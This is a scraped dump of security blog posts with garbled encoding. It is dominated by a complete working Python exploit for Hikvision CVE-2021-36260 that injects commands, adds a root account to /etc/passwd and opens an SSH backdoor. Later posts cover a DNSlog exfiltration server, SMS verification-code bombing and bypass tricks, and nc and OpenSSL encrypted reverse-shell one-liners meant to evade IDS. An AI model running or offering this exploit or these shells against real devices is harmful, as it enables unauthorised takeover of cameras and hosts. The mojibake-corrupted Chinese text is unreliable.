parser.add_argument(&#x27;--cmd_blind&#x27;, required=False, type=str, default=None, help=&#x27;execute blind cmd (i.e: &quot;reboot&quot;)&#x27;) parser.add_argument( &#x27;--noverify&#x27;, required=False, default=False, action=&#x27;store_true&#x27;, help=&#x27;Do not verify if vulnerable&#x27; ) parser.add_argument( &#x27;--proto&#x27;, required=False, type=str, choices=[&#x27;http&#x27;, &#x27;https&#x27;], default=&#x27;http&#x27;, help=&#x27;Protocol used&#x27; ) args = parser.parse_args() remote = Http(args.rhost, args.rport, args.proto) try: if args.shell: shell(remote, args) elif args.cmd: cmd(remote, args) elif args.cmd_blind: cmd_blind(remote, args) elif args.check: check(remote, args) elif args.reboot: check_reboot(remote, args) else: parser.parse_args([&#x27;-h&#x27;]) except KeyboardInterrupt: return Falseif __name__ == &#x27;__main__&#x27;: main() import osimport argparseimport timeimport requestsfrom requests import packagesfrom requests.packages import urllib3from requests.packages.urllib3 import exceptionsclass Http(object): def __init__(self, rhost, rport, proto, timeout=60): super(Http, self).__init__() self.rhost = rhost self.rport = rport self.proto = proto self.timeout = timeout self.remote = None self.uri = None requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning) self.remote = requests.Session() self._init_uri() self.remote.headers.update(&#123; &#x27;Host&#x27;: f&#x27;&#123;self.rhost&#125;:&#123;self.rport&#125;&#x27;, &#x27;Accept&#x27;: &#x27;*/*&#x27;, &#x27;X-Requested-With&#x27;: &#x27;XMLHttpRequest&#x27;, &#x27;Content-Type&#x27;: &#x27;application/x-www-form-urlencoded; charset=UTF-8&#x27;, &#x27;Accept-Encoding&#x27;: &#x27;gzip, deflate&#x27;, &#x27;Accept-Language&#x27;: &#x27;en-US,en;q=0.9,sv;q=0.8&#x27;, &#125;) def send(self, url=None, query_args=None, timeout=5): if query_args: if len(query_args) &gt; 22: print(f&#x27;[!] Error: Command &quot;&#123;query_args&#125;&quot; to long (&#123;len(query_args)&#125;)&#x27;) return None try: if url and not query_args: return self.get(url, timeout) else: data = self.put(&#x27;/SDK/webLanguage&#x27;, query_args, timeout) except requests.exceptions.ConnectionError: self.proto = &#x27;https&#x27; if self.proto == &#x27;http&#x27; else &#x27;https&#x27; self._init_uri() try: if url and not query_args: return self.get(url, timeout) else: data = self.put(&#x27;/SDK/webLanguage&#x27;, query_args, timeout) except requests.exceptions.ConnectionError: return None except requests.exceptions.RequestException: return None except KeyboardInterrupt: return None if data.status_code == 302: redirect = data.headers.get(&#x27;Location&#x27;) self.uri = redirect[:redirect.rfind(&#x27;/&#x27;)] self._update_host() if url and not query_args: return self.get(url, timeout) else: data = self.put(&#x27;/SDK/webLanguage&#x27;, query_args, timeout) return data def _update_host(self): if not self.remote.headers.get(&#x27;Host&#x27;) == self.uri[self.uri.rfind(&#x27;://&#x27;) + 3:]: self.remote.headers.update(&#123; &#x27;Host&#x27;: self.uri[self.uri.rfind(&#x27;://&#x27;) + 3:], &#125;) def _init_uri(self): self.uri = &#x27;&#123;proto&#125;://&#123;rhost&#125;:&#123;rport&#125;&#x27;.format(proto=self.proto, rhost=self.rhost, rport=str(self.rport)) def put(self, url, query_args, timeout): query_args = &#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&#x27; \\ f&#x27;&lt;language&gt;$(&#123;query_args&#125;)&lt;/language&gt;&#x27; return self.remote.put(self.uri + url, data=query_args, verify=False, allow_redirects=False, timeout=timeout) def get(self, url, timeout): return self.remote.get(self.uri + url, verify=False, allow_redirects=False, timeout=timeout)def check(remote, args): if args.noverify: print(f&#x27;[*] Not verifying remote &quot;&#123;args.rhost&#125;:&#123;args.rport&#125;&quot;&#x27;) return True print(f&#x27;[*] Checking remote &quot;&#123;args.rhost&#125;:&#123;args.rport&#125;&quot;&#x27;) data = remote.send(url=&#x27;/&#x27;, query_args=None) if data is None: print(f&#x27;[-] Cannot establish connection to &quot;&#123;args.rhost&#125;:&#123;args.rport&#125;&quot;&#x27;) return None print(&#x27;[i] ETag:&#x27;, data.headers.get(&#x27;ETag&#x27;)) data = remote.send(query_args=&#x27;&gt;webLib/c&#x27;) if data is None or data.status_code == 404: print(f&#x27;[-] &quot;&#123;args.rhost&#125;:&#123;args.rport&#125;&quot; do not looks like Hikvision&#x27;) return False status_code = data.status_code data = remote.send(url=&#x27;/c&#x27;, query_args=None) if not data.status_code == 200: if status_code == 500: print(f&#x27;[-] Could not verify if vulnerable (Code: &#123;status_code&#125;)&#x27;) if args.reboot: return check_reboot(remote, args) else: print(f&#x27;[+] Remote is not vulnerable (Code: &#123;status_code&#125;)&#x27;) return False print(&#x27;[!] Remote is verified exploitable&#x27;) return Truedef check_reboot(remote, args): if args.check: print(&#x27;[i] Checking if vulnerable with &quot;reboot&quot;&#x27;) else: print(f&#x27;[*] Checking remote &quot;&#123;args.rhost&#125;:&#123;args.rport&#125;&quot; with &quot;reboot&quot;&#x27;) remote.send(query_args=&#x27;reboot&#x27;) time.sleep(2) if not remote.send(url=&#x27;/&#x27;, query_args=None): print(&#x27;[!] Remote is vulnerable&#x27;) return True else: print(&#x27;[+] Remote is not vulnerable&#x27;) return Falsedef cmd(remote, args): if not check(remote, args): return False data = remote.send(query_args=f&#x27;&#123;args.cmd&#125;&gt;webLib/x&#x27;) if data is None: return False data = remote.send(url=&#x27;/x&#x27;, query_args=None) if data is None or not data.status_code == 200: print(f&#x27;[!] Error execute cmd &quot;&#123;args.cmd&#125;&quot;&#x27;) return False print(data.text) return Truedef cmd_blind(remote, args): if not check(remote, args): return False data = remote.send(query_args=f&#x27;&#123;args.cmd_blind&#125;&#x27;) if data is None or not data.status_code == 500: print(f&#x27;[-] Error execute cmd &quot;&#123;args.cmd_blind&#125;&quot;&#x27;) return False print(f&#x27;[i] Try execute blind cmd &quot;&#123;args.cmd_blind&#125;&quot;&#x27;) return Truedef shell(remote, args): if not check(remote, args): return False data = remote.send(url=&#x27;/N&#x27;, query_args=None) if data.status_code == 404: print(f&#x27;[i] Remote &quot;&#123;args.rhost&#125;&quot; not pwned, pwning now!&#x27;) data = remote.send(query_args=&#x27;echo -n P::0:0:W&gt;N&#x27;) if data.status_code == 401: print(data.headers) print(data.text) return False remote.send(query_args=&#x27;echo :/:/bin/sh&gt;&gt;N&#x27;) remote.send(query_args=&#x27;cat N&gt;&gt;/etc/passwd&#x27;) remote.send(query_args=&#x27;dropbear -R -B -p 1337&#x27;) remote.send(query_args=&#x27;cat N&gt;webLib/N&#x27;) else: print(f&#x27;[i] Remote &quot;&#123;args.rhost&#125;&quot; already pwned&#x27;) print(f&#x27;[*] Trying SSH to &#123;args.rhost&#125; on port 1337&#x27;) os.system(f&#x27;ssh -o StrictHostKeyChecking=no -o LogLevel=error -o UserKnownHostsFile=/dev/null \\ P@&#123;args.rhost&#125; -p 1337&#x27;)def main(): print(&#x27;[*] Hikvision CVE-2021-36260\\n[*] PoC by bashis &lt;mcw noemail eu&gt; (2021)&#x27;) parser = argparse.ArgumentParser() parser.add_argument(&#x27;--rhost&#x27;, required=True, type=str, default=None, help=&#x27;Remote Target Address (IP/FQDN)&#x27;) parser.add_argument(&#x27;--rport&#x27;, required=False, type=int, default=80, help=&#x27;Remote Target Port&#x27;) parser.add_argument(&#x27;--check&#x27;, required=False, default=False, action=&#x27;store_true&#x27;, help=&#x27;Check if vulnerable&#x27;) parser.add_argument(&#x27;--reboot&#x27;, required=False, default=False, action=&#x27;store_true&#x27;, help=&#x27;Reboot if vulnerable&#x27;) parser.add_argument(&#x27;--shell&#x27;, required=False, default=False, action=&#x27;store_true&#x27;, help=&#x27;Launch SSH shell&#x27;) parser.add_argument(&#x27;--cmd&#x27;, required=False, type=str, default=None, help=&#x27;execute cmd (i.e: &quot;ls -l&quot;)&#x27;) parser.add_argument(&#x27;--cmd_blind&#x27;, required=False, type=str, default=None, help=&#x27;execute blind cmd (i.e: &quot;reboot&quot;)&#x27;) parser.add_argument( &#x27;--noverify&#x27;, required=False, default=False, action=&#x27;store_true&#x27;, help=&#x27;Do not verify if vulnerable&#x27; ) parser.add_argument( &#x27;--proto&#x27;, required=False, type=str, choices=[&#x27;http&#x27;, &#x27;https&#x27;], default=&#x27;http&#x27;, help=&#x27;Protocol used&#x27; ) args = parser.parse_args() remote = Http(args.rhost, args.rport, args.proto) try: if args.shell: shell(remote, args) elif args.cmd: cmd(remote, args) elif args.cmd_blind: cmd_blind(remote, args) elif args.check: check(remote, args) elif args.reboot: check_reboot(remote, args) else: parser.parse_args([&#x27;-h&#x27;]) except KeyboardInterrupt: return Falseif __name__ == &#x27;__main__&#x27;: main()","categories":[{"name":"Webå®‰å…¨","slug":"Webå®‰å…¨","permalink":"https://wolke.cn/categories/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"Hikvison","slug":"Hikvison","permalink":"https://wolke.cn/tags/Hikvison/"}],"author":"w01ke"},{"title":"DNSlogå¹³å°çš„æ­å»º","slug":"DNSlogå¹³å°çš„æ­å»º","date":"2022-07-11T19:33:21.000Z","updated":"2022-07-11T19:53:40.207Z","comments":true,"path":"post/54d8f8e4.html","link":"","permalink":"https://wolke.cn/post/54d8f8e4.html","excerpt":"","text":"ä¸€ã€DNSlogç®€ä»‹åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæ— æ³•åˆ©ç”¨æ¼æ´è·å¾—å›æ˜¾ã€‚ä½†æ˜¯ï¼Œå¦‚æœç›®æ ‡å¯ä»¥å‘é€DNSè¯·æ±‚ï¼Œåˆ™å¯ä»¥é€šè¿‡DNS logæ–¹å¼å°†æƒ³è·å¾—çš„æ•°æ®å¤–å¸¦å‡ºæ¥ï¼ˆoobï¼‰ã€‚ DNS logå¸¸ç”¨äºä»¥ä¸‹æƒ…å†µï¼š SQLç›²æ³¨ æ— å›æ˜¾çš„å‘½ä»¤æ‰§è¡Œ æ— å›æ˜¾çš„SSRF äºŒã€æ­å»ºDNS logå¹³å°1ã€å‰æœŸå‡†å¤‡ä¸€å°VPS 1.x.x.x ä¸€ä¸ªåŸŸå wolke.cn åœ¨wolke.cnä¸­æ·»åŠ æ·»åŠ ä¸€ä¸ªAè®°å½•ä¸ä¸€ä¸ªNSè®°å½•ã€‚å…¶ä¸­Aè®°å½•æŒ‡å‘æœåŠ¡å™¨IPåœ°å€ï¼ŒNSè®°å½•æŒ‡å‘Aè®°å½•çš„åŸŸååœ°å€ 2ã€é¡¹ç›®éƒ¨ç½²å‚è€ƒå¼€æºé¡¹ç›®DNSlog-GOï¼šhttps://github.com/lanyi1998/DNSlog-GO è¯¥é¡¹ç›®æ˜¯ç”±GOè¯­è¨€ç¼–å†™çš„,æ‰€ä»¥éƒ¨ç½²çš„æ—¶å€™éœ€è¦ç”¨åˆ°GOè¯­è¨€çš„ç¯å¢ƒ DNSä½¿ç”¨çš„æ˜¯53ï¼ˆUDPï¼‰ç«¯å£ï¼Œè®°å¾—53ç«¯å£çš„æ”¾è¡Œ é…ç½®æ–‡ä»¶config.yamlçš„ä¿®æ”¹ï¼ˆæˆ‘è¿™é‡ŒHTTPé‡‡ç”¨çš„æ˜¯8000ç«¯å£ï¼Œä¹Ÿè®°å¾—è¦æ”¾è¡Œï¼‰ å¯åŠ¨ 3ã€æµ‹è¯•è®¿é—®http://ip:8000 éœ€è¦è¾“å…¥tokenï¼Œè¿™é‡Œçš„tokenå°±æ˜¯config.yamlè®¾ç½®çš„å€¼ ç‚¹å‡»å¤åˆ¶éšæœºå­åŸŸåè·å–åˆ° 8xek8.dnslog.wolke.cn ä½¿ç”¨pingå‘½ä»¤ å¯ä»¥çœ‹åˆ°å›æ˜¾ç»“æœ ä¸‰ã€åå°è¿è¡Œå¹¶åŠ å…¥å¼€æœºè‡ªå¯åŠ¨ä¸Šé¢çš„æ–¹æ³•æœ‰ä¸¤ä¸ªä¸è¶³ æ— æ³•åå°è¿è¡Œ é‡å¯åè¿›ç¨‹ä¸å¤å­˜åœ¨ ç»è¿‡ä¸€ä¸ªå¤šå°æ—¶çš„æ’é”™å’Œæœç´¢èµ„æ–™ï¼Œç»ˆäºå®ç°äº†å¼€æœºè‡ªå¯åŠ¨å¹¶åå°è¿è¡Œã€‚è¿™é‡Œæˆ‘è¯¦ç»†åœ°å†™ä¸‹æ•™ç¨‹ï¼Œå…å¾—å¤§å®¶åƒæˆ‘ä¸€æ ·å‡ºç°å¾ˆå¤šé”™è¯¯è€½è¯¯æ—¶é—´ã€‚ 1ã€ç¼–å†™Shellè„šæœ¬åœ¨/root/DNSlogç›®å½•ä¸‹ç¼–å†™run.shï¼Œå†…å®¹å¦‚ä¸‹ cd /root/DNSlog # è¿™é‡Œæ ¹æ®è‡ªå·±DNSlogçš„mainå¯æ‰§è¡Œæ–‡ä»¶æ‰€åœ¨ä½ç½®è¿›è¡Œä¿®æ”¹å³å¯./main &amp; ä¹‹åæ‰§è¡Œrun.shè¿™ä¸ªè„šæœ¬ï¼Œæ­¤æ—¶è¿›ç¨‹è™½ç„¶ä¼šè¾“å‡ºåˆ°å½“å‰ç»ˆç«¯ä¼šè¯ï¼Œä½†å…¶å®è¿›ç¨‹å·²ç»è„±ç¦»äº†å½“å‰ä¼šè¯ï¼Œå¯ä»¥å®‰å…¨çš„æ¨å‡ºä¼šè¯ï¼Œè¿›ç¨‹ä¹Ÿä¸ä¼šé€€å‡ºã€‚ 2ã€ä¿®æ”¹rc.localvim /etc/rc.d/rc.local åœ¨æœ«å°¾åŠ ä¸Šè¿™å¥ /root/DNSlog/run.sh &gt;/dev/null 2&gt;&amp;1 ç»™rc.localåŠ ä¸Šå¯æ‰§è¡Œæƒé™ chmod +x /etc/rc.d/rc.local 3ã€ä¿®æ”¹rc-localæœåŠ¡systemctl status rc-local.service # æ£€æŸ¥rc-localæœåŠ¡æ˜¯å¦å¼€å¯systemctl start rc-local.service # å¼€å¯rc-localæœåŠ¡systemctl enable rc-local.service # å°†rc-localæœåŠ¡åŠ å…¥å¼€æœºè‡ªå¯åŠ¨ 4ã€æµ‹è¯•é‡å¯vpsåï¼Œä½¿ç”¨ps -efå¯ä»¥å‘ç°å·²ç»è‡ªåŠ¨è¿è¡Œäº†è¯¥ç¨‹åºï¼Œåå°è¿›ç¨‹IDä¸º1146 WebæœåŠ¡ä¹Ÿèƒ½æˆåŠŸè®¿é—® æ€æ­»è¿›ç¨‹å¯ä»¥ä½¿ç”¨å‘½ä»¤ kill -9 è¿›ç¨‹PID 5ã€æœ€ååˆ°è¿™é‡Œæˆ‘ä»¬å°±å®ç°äº†åªè¦VPSå¤„äºå¼€æœºçŠ¶æ€ï¼Œmainç¨‹åºå°±è‡ªåŠ¨è¿è¡Œï¼Œå¸¸å¼€éšç”¨ï¼Œæˆ‘ä»¬å¯ä»¥æ–¹ä¾¿å¿«æ·åœ°ä½¿ç”¨DNSlogã€‚ä½†å¸¸å¼€éšç”¨ä¹Ÿå¸¦æ¥äº†ä¸€ä¸ªé—®é¢˜å°±æ˜¯ï¼Œå¦‚æœæŸä¸ªæ”»å‡»è€…è·å¾—äº†æˆ‘ä»¬çš„Tokenï¼ˆç¤¾å·¥æˆ–çˆ†ç ´ç­‰æ‰‹æ®µï¼‰ï¼Œé‚£ä¹ˆæ”»å‡»è€…å°±å¯èƒ½ä¼šä½¿ç”¨æˆ‘ä»¬çš„VPSä¸»æœºå¼€å¯çš„DNSlogæœåŠ¡å»è¿›è¡Œä¸€äº›éæ³•æ¸—é€ï¼Œè€Œå¦‚æœè¢«æº¯æºåˆ°å°±ä¼šå¾ˆéº»çƒ¦ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æé«˜Tokençš„å¤æ‚åº¦ä¸”é¿å…æ³„éœ²ï¼Œæˆ–è€…ä¸ä½¿ç”¨è¿™èŠ‚çš„æŠ€æœ¯ï¼Œä½¿ç”¨åŸå§‹çš„éšå¼€éšç”¨æ–¹æ³•ï¼Œä»€ä¹ˆæ—¶å€™éœ€è¦ç”¨DNSlogå°±ä»€ä¹ˆæ—¶å€™è¿è¡Œmainç¨‹åºï¼Œå¾ˆå¤§ç¨‹åº¦ä¸Šå¯ä»¥é¿å…è¿™ä¸ªé—®é¢˜ã€‚","categories":[{"name":"Webå®‰å…¨","slug":"Webå®‰å…¨","permalink":"https://wolke.cn/categories/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"Webå®‰å…¨","slug":"Webå®‰å…¨","permalink":"https://wolke.cn/tags/Web%E5%AE%89%E5%85%A8/"},{"name":"DNSlog","slug":"DNSlog","permalink":"https://wolke.cn/tags/DNSlog/"}],"author":"w01ke"},{"title":"å…³äºéªŒè¯ç çš„é‚£äº›æ¼æ´","slug":"å…³äºéªŒè¯ç çš„é‚£äº›æ¼æ´","date":"2022-07-11T14:34:12.000Z","updated":"2022-07-11T15:07:14.084Z","comments":true,"path":"post/48a6d673.html","link":"","permalink":"https://wolke.cn/post/48a6d673.html","excerpt":"","text":"æœ€è¿‘çœ‹åˆ°åäºŒå¸ˆå‚…å†™äº†ç¯‡å…³äºéªŒè¯ç æ¼æ´çš„æ–‡ç« ï¼Œè§‰å¾—æ€»ç»“å¾—å¾ˆå¥½ï¼Œä¹Ÿå­¦åˆ°äº†ä¸€äº›æ–°æ€è·¯ï¼Œè®©æˆ‘å—ç›ŠåŒªæµ…ï¼ŒåŸæ–‡é“¾æ¥ï¼š https://www.yuque.com/shier-mfbht/qh4bgb/zcee3k ä¸€ã€çŸ­ä¿¡è½°ç‚¸è¿™ç±»æ¼æ´å­˜åœ¨çš„åŸå› æ˜¯æ²¡æœ‰å¯¹çŸ­ä¿¡éªŒè¯ç çš„å‘é€æ—¶é—´ã€ç”¨æˆ·åŠå…¶IPä½œä¸€äº›é™åˆ¶ã€‚ 1ã€æ­£å¸¸çš„çŸ­ä¿¡è½°ç‚¸ burpä¸€ç›´å‘åŒ…å³å¯ 2ã€å¹¶å‘ç»•è¿‡åšäº†é™åˆ¶å’‹åŠï¼Ÿå¯ä»¥è¯•è¯•å¹¶å‘(ä¸‡ç‰©çš†å¯å¹¶å‘) ä½¿ç”¨turbo intruderæ’ä»¶è¿›è¡Œå¹¶å‘ã€‚ å¹¶å‘æ¬¡æ•°è¶Šå¤§æ˜¯ä¸æ˜¯è½°ç‚¸å°±è¶Šå¤š 3ã€åˆ é™¤Cookieç»•è¿‡ å¯ä»¥å°è¯•æŠŠcookieåˆ æ‰ï¼Œæœ‰äº›å¼€å‘å°±å¯èƒ½æ ¹æ®cookieåˆ¤æ–­éªŒè¯ç æ˜¯å¦è·å–è¿‡ 4ã€ç‰¹æ®Šæ ¼å¼ç»•è¿‡ æ‰‹æœºå·ç å‰ååŠ ç©ºæ ¼ï¼Œ86ï¼Œ086ï¼Œ0086ï¼Œ+86ï¼Œ0ï¼Œ00ï¼Œ/r,/n, ä»¥åŠç‰¹æ®Šç¬¦å·ç­‰ ä¿®æ”¹cookieï¼Œå˜é‡ï¼Œè¿”å› 138888888889 12ä½ç»è¿‡çŸ­ä¿¡ç½‘å…³å–å‰11ä½ï¼Œå¯¼è‡´çŸ­ä¿¡è½°ç‚¸ è¿›è¡Œèƒ½è§£æçš„ç¼–ç ã€‚ äºŒã€æš´åŠ›ç ´è§£ï¼ˆä»»æ„ç”¨æˆ·ç™»å½•æ³¨å†Œï¼‰æœåŠ¡ç«¯æœªå¯¹éªŒè¯æ—¶é—´ã€æ¬¡æ•°ä½œå‡ºé™åˆ¶ï¼Œå­˜åœ¨çˆ†ç ´çš„å¯èƒ½æ€§ã€‚ç®€å•çš„ç³»ç»Ÿå­˜åœ¨å¯ä»¥ç›´æ¥çˆ†ç ´çš„å¯èƒ½æ€§ï¼Œä½†åšè¿‡ä¸€äº›é˜²æŠ¤çš„ç³»ç»Ÿè¿˜å¾—è¿›è¡Œä¸€äº›ç»•è¿‡æ‰èƒ½è¿›è¡Œçˆ†ç ´ã€‚ burpsuiteå¯¹çº¯æ•°å­—éªŒè¯ç çˆ†ç ´æ—¶é—´ä¼°è®¡ï¼š å¯¹äº4ä½çº¯æ•°å­—éªŒè¯ç ï¼šä»0000~9999çš„10000ç§å¯èƒ½ç”¨å¤šçº¿ç¨‹åœ¨5åˆ†é’Ÿå†…è·‘å®Œå¹¶ä¸æ˜¯å¾ˆéš¾ã€‚ å¯¹äº6ä½çº¯æ•°å­—éªŒè¯ç ï¼šå…­ä½æ•°çš„éªŒè¯ç 1000000ä½ï¼Œå•ä»çˆ†ç ´æ—¶é—´ä¸Šæ¥çœ‹å°±æ¯”4ä½æ•°çš„å¤š100å€ã€‚ ä¸‰ã€éªŒè¯ç å›æ˜¾éªŒè¯ç åœ¨è¿”å›åŒ…ï¼Œè§‚å¯ŸåŒ…å³å¯ å››ã€éªŒè¯ç ç»•è¿‡ç”¨æˆ·ç»‘å®šäº†æ‰‹æœºå·ï¼Œæ­£å¸¸æ¥è¯´æ˜¯è·å–ç»‘å®šæ‰‹æœºå·çš„çŸ­ä¿¡ï¼Œé€šè¿‡burpä¿®æ”¹æˆå…¶ä»–æ‰‹æœºå· æŠŠè¿™ä¸ªæ‰‹æœºå·æ”¹æˆå…¶ä»–æ‰‹æœºå·çš„ ç‚¹å‡»æäº¤ï¼ŒæŠ“åŒ…æ”¹æˆå…¶ä»–åˆšåˆšæ¥æ”¶çŸ­ä¿¡çš„æ‰‹æœºå· äº”ã€éªŒè¯ç è½¬å‘ åŠ ä¸ªé€—å·åé¢æ¥ä¸Šéœ€è¦è½¬å‘çš„æ‰‹æœºå·ï¼Œå› ä¸ºå¼€å‘å¯èƒ½ä½¿ç”¨æ•°ç»„å°±å¯¼è‡´åŒæ—¶æŠŠéªŒè¯ç å‘ç»™ä¸¤ä¸ªæ‰‹æœºå·","categories":[{"name":"Webå®‰å…¨","slug":"Webå®‰å…¨","permalink":"https://wolke.cn/categories/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"Webå®‰å…¨","slug":"Webå®‰å…¨","permalink":"https://wolke.cn/tags/Web%E5%AE%89%E5%85%A8/"},{"name":"éªŒè¯ç ","slug":"éªŒè¯ç ","permalink":"https://wolke.cn/tags/%E9%AA%8C%E8%AF%81%E7%A0%81/"}],"author":"w01ke"},{"title":"OpenSSLåå¼¹åŠ å¯†Shell","slug":"OpenSSLåå¼¹åŠ å¯†Shell","date":"2022-05-13T08:39:35.000Z","updated":"2022-05-13T08:49:54.194Z","comments":true,"path":"post/4904f19c.html","link":"","permalink":"https://wolke.cn/post/4904f19c.html","excerpt":"","text":"ä¸€ã€å‰è¨€åœ¨è¿›è¡Œçº¢é˜Ÿæ¸—é€æµ‹è¯•çš„åæ¸—é€é˜¶æ®µä¸ºäº†è¿›ä¸€æ­¥æ¨ªè¡Œæ¸—é€å¾€å¾€éœ€è¦åå¼¹ shellï¼Œè¿™é‡Œåˆ—å‡ºäº†ä½¿ç”¨å„ç§è¯­è¨€è¿›è¡Œåå¼¹ shell çš„æ–¹æ³•ï¼Œæˆ‘å‘ç°è¿™ç§åå¼¹ shell æ–¹å¼éƒ½æœ‰ä¸€ä¸ªç¼ºç‚¹ï¼Œé‚£å°±æ˜¯æ‰€æœ‰çš„æµé‡éƒ½æ˜¯æ˜æ–‡ä¼ è¾“çš„ã€‚ æˆ‘ä»¬ä½¿ç”¨ nc åå¼¹ shell è¿›è¡Œæµ‹è¯• Kali: nc -lvp 4444Win7: nc 192.168.1.6 4444 -e cmd ä½¿ç”¨ wireshark å¯ä»¥ç›´æ¥çœ‹åˆ°æˆ‘ä»¬æ‰§è¡Œçš„å‘½ä»¤å’Œè¿”å›ä¿¡æ¯ åœ¨è¿™ç§æƒ…å†µä¸‹å½“æˆ‘ä»¬è¿›è¡Œæ“ä½œæ—¶ï¼Œç½‘ç»œé˜²å¾¡æ£€æµ‹ç³»ç»Ÿ(IDSã€IPSç­‰)ä¼šè·å–åˆ°æˆ‘ä»¬çš„é€šä¿¡å†…å®¹å¹¶è¿›è¡Œå‘Šè­¦å’Œé˜»æ­¢ï¼Œå› æ­¤éœ€è¦å¯¹é€šä¿¡å†…å®¹è¿›è¡Œæ··æ·†æˆ–åŠ å¯†ï¼Œè¿™æ—¶å¯ä»¥é€‰æ‹©ä½¿ç”¨ OpenSSL åå¼¹ä¸€ä¸ªåŠ å¯† shellã€‚ äºŒã€OpenSSLç®€ä»‹åœ¨è®¡ç®—æœºç½‘ç»œä¸Šï¼ŒOpenSSL æ˜¯ä¸€ä¸ªå¼€æ”¾æºä»£ç çš„è½¯ä»¶åº“åŒ…ï¼Œåº”ç”¨ç¨‹åºå¯ä»¥ä½¿ç”¨è¿™ä¸ªåŒ…æ¥è¿›è¡Œå®‰å…¨é€šä¿¡ï¼Œé¿å…çªƒå¬ï¼ŒåŒæ—¶ç¡®è®¤å¦ä¸€ç«¯è¿æ¥è€…çš„èº«ä»½ åˆ©ç”¨ OpenSSL åå¼¹ shell ä¹‹å‰éœ€è¦ç”Ÿæˆè‡ªç­¾åè¯ä¹¦ ä¸‰ã€ä½¿ç”¨OpenSSLç”Ÿæˆè‡ªç­¾åè¯ä¹¦openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes ç”Ÿæˆè‡ªç­¾åè¯ä¹¦æ—¶ä¼šæç¤ºè¾“å…¥è¯ä¹¦ä¿¡æ¯ï¼Œå¦‚æœæ‡’å¾—å¡«å†™å¯ä»¥ä¸€è·¯å›è½¦ å››ã€ä½¿ç”¨OpenSSLåå¼¹åŠ å¯†shellï¼ˆ1ï¼‰Linuxå‡è®¾æˆ‘ä»¬ä» A ä¸»æœºåå¼¹ shell åˆ° B ä¸»æœº ------------------ ----------------------| A:192.168.1.8 | --- shell ---&gt; | B:192.168.1.6:4444 |------------------ ---------------------- é¦–å…ˆéœ€ç”¨åˆ©ç”¨ä¸Šä¸€æ­¥ç”Ÿæˆçš„è‡ªç­¾åè¯ä¹¦ï¼Œåœ¨ B ä¸»æœºä¸Šä½¿ç”¨ OpenSSL ç›‘å¬ä¸€ä¸ªç«¯å£ï¼Œåœ¨è¿™é‡Œä½¿ç”¨ 4444 ç«¯å£ openssl s_server -quiet -key key.pem -cert cert.pem -port 4444 æ­¤æ—¶ OpenSSL åœ¨ 4444 ç«¯å£ä¸Šå¯åŠ¨äº†ä¸€ä¸ª SSL/TLS server è¿™æ—¶åœ¨ A ä¸»æœºè¿›è¡Œåå¼¹ shell æ“ä½œï¼Œå‘½ä»¤ä¸ºï¼š mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect 192.168.1.6:4444 &gt; /tmp/s; rm /tmp/s è¿™æ ·å°±ä½¿ç”¨ OpenSSL åå¼¹äº†ä¸€ä¸ªåŠ å¯†çš„ shell æ•ˆæœå¦‚ä¸‹ï¼š ä½¿ç”¨ wireshark æŠ“åŒ…å¯ä»¥çœ‹åˆ°ï¼ŒA å’Œ B ä¸»æœºä¹‹é—´åœ¨ä½¿ç”¨ TLS1.2 åè®®è¿›è¡ŒåŠ å¯†é€šä¿¡ ï¼ˆ2ï¼‰Windowsåœ¨ Windows ç³»ç»Ÿä¸Šåå¼¹åŠ å¯† shell çš„æ–¹å¼æœ‰ç‚¹ä¸ä¸€æ · å…·ä½“å‘½ä»¤å¦‚ä¸‹ï¼š openssl s_client -quiet -connect [ip]:[port1] | cmd.exe | openssl s_client -quiet -connect [ip]:[port2] ä»¥ä¸Šå‘½ä»¤ä¼šä» [ip]:[port1] è·å–å‘½ä»¤å‘é€ç»™ cmd.exeæ‰§è¡Œï¼Œç„¶åæŠŠç»“æœè¿”å›åˆ° [ip]:[port2] å› æ­¤åœ¨æœ¬æœºéœ€è¦å¯åŠ¨ä¸¤ä¸ª s_server ä» port1 å‘é€å‘½ä»¤åˆ° cmd openssl s_server -quiet -key [keyfile] -cert [cert] -port [port1] ä» port2 è·å–å‘é€ç»™ port1 çš„å‘½ä»¤æ‰§è¡Œç»“æœ openssl s_server -quiet -key [keyfile] -cert [cert] -port [port2] äº”ã€ä½¿ç”¨ OpenSSL æ­å»ºç®€æ˜“ HTTPS Serverä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å‰éœ€è¦ä½¿ç”¨ OpenSSL ç”Ÿæˆè¯ä¹¦è‡ªç­¾åè¯ä¹¦ï¼Œå‘½ä»¤åœ¨ä¸Šæ–‡ä¸­å·²ç»™å‡º openssl s_server -key key.pem -cert cert.pem -accept 44330 -WWW ä»¥ä¸Šå‘½ä»¤åœ¨ 44330 ç«¯å£å¯åŠ¨äº†ä¸€ä¸ª HTTPS Server","categories":[{"name":"å†…ç½‘æ¸—é€","slug":"å†…ç½‘æ¸—é€","permalink":"https://wolke.cn/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"OpenSSL","slug":"OpenSSL","permalink":"https://wolke.cn/tags/OpenSSL/"}],"author":"w01ke"},{"title":"ä½¿ç”¨Kaliè¿›è¡Œå†…ç½‘æ¸—é€","slug":"ä½¿ç”¨Kaliè¿›è¡Œå†…ç½‘æ¸—é€","date":"2022-05-07T13:40:12.000Z","updated":"2022-05-14T09:08:16.548Z","comments":true,"path":"post/fd7d7a05.html","link":"","permalink":"https://wolke.cn/post/fd7d7a05.html","excerpt":"","text":"ä¸€ã€ç½‘ç»œæ‹“æ‰‘å›¾å‡å¦‚æˆ‘ä»¬æ‹¿åˆ°äº†ä¸€å°ä¸»æœºæ¯”å¦‚Win2008çš„shellï¼Œå¦‚ä½•é€šè¿‡è¯¥ä¸»æœºè¿›è¡Œå†…ç½‘æ¸—é€ï¼Œæ‹¿åˆ°æ¯”å¦‚ä¸‹å›¾ä¸­æ•°æ®æœåŠ¡å™¨çš„æœ€é«˜æƒé™ï¼Ÿ 